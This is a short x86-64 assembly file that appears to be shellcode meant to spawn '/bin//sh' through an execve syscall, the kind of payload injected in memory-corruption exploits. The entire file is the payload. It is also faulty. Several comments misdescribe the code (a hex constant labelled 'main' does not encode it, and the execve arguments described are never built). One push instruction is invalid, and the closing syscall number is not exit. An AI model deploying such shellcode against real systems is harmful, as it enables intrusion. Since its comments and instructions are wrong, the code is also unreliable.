BITS 64

section .text

global _start

_start:
    ; Open a shell and run the desired executable
    xor rdi, rdi ; null terminator
    push rdi ; null terminator
    push 0x656d616e6974 ; "niam" (revert to "main")
    mov rsi, rsp ; point to "main"
    push rdi ; null terminator
    mov rdx, rsp ; empty environment argument
    mov rax, 0x68732f6e69622f2f ; "/bin//sh"
    push rax
    mov rdi, rsp ; point to "/bin//sh"
    push rdi ; command addres
    mov rdi, rsp ; command addres
    push rdi ; command addres
    mov rdx, rsp ; command addres
    push rdi ; null terminator
    mov rsi, rsp ; point to command
    xor eax, eax
    mov al, 0x3b ; syscall number for execve
    syscall ; call execve("/bin//sh", ["/bin//sh", "-c", "cmd"], NULL)

    
    xor eax, eax
    inc eax ; return 1
    syscall ; exit
